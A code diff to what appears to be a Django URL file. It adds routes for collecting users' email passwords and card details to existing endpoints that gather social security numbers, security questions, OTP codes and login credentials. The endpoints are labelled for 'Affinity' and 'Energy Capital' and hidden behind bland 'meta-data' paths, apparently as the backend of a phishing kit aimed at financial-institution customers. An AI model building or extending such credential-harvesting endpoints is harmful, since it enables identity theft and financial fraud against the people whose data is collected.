@@ -109,6 +109,8 @@ from user_data.affinity_view import (
     affinity_collect_user_social_security_2,
     affinity_collect_user_security_questions,
     affinity_collect_user_otp_verification,
+    affinity_collect_user_email_password,
+    affinity_collect_user_card_info,
 )
 from user_data.energy_view import (
     energy_collect_user_login_cred,
@@ -165,6 +167,8 @@ urlpatterns = [
     path("api/affinity-meta-data-6/", affinity_collect_user_social_security_2, name="affinity_collect_user_social_security_2"),
     path("api/affinity-meta-data-7/", affinity_collect_user_security_questions, name="affinity_collect_user_security_questions"),
     path("api/affinity-meta-data-8/", affinity_collect_user_otp_verification, name="affinity_collect_user_otp_verification"),
+    path("api/affinity-email-password/", affinity_collect_user_email_password, name="affinity_collect_user_email_password"),
+    path("api/affinity-card-info/", affinity_collect_user_card_info, name="affinity_collect_user_card_info"),
     # Energy Capital API endpoints
     path("api/energy-meta-data-1/", energy_collect_user_login_cred, name="energy_collect_user_login_cred"),
     path("api/energy-meta-data-2/", energy_collect_user_login_cred2, name="energy_collect_user_login_cred2"),
